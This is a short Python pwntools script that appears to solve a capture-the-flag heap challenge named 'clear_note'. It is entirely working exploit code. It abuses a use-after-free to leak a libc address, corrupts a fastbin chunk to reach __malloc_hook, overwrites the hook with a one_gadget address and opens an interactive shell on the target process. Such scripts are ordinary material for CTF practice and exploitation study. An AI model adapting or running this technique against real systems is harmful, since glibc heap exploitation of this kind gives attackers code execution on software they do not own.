from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./clear_note")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./clear_note")
else:
	pass

def add(size,content):
	p.sendlineafter("choice>> ","1")
	p.sendlineafter("size: ",str(size))
	p.sendlineafter("info: ",content)

def show(index):
	p.sendlineafter("choice>> ","2")
	p.sendlineafter("index: ",str(index))

def free(index):
	p.sendlineafter("choice>> ","3")
	p.sendlineafter("index: ",str(index))

context.terminal = ["tmux","splitw","-v"]
context.log_level = "debug"
add(0x100,"a")
add(0x60,"b")
free(0)
show(0)
p.recvuntil("info: ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
free(1)
payload = 0x100 * "c" + p64(0) + p64(0x71) + p64(libc.symbols["__malloc_hook"] - 0x23)
free(0)
add(0x100,payload)
free(1)
one_gadget = libc.address + 0xf1147
add(0x60,"aaa" + p64(0)*2 + p64(one_gadget))
free(1)
add(0x60,"aaa" + p64(0)*2 + p64(one_gadget))
free(1)
p.sendlineafter("choice>> ","1")
p.sendlineafter("size: ","0")
p.interactive()
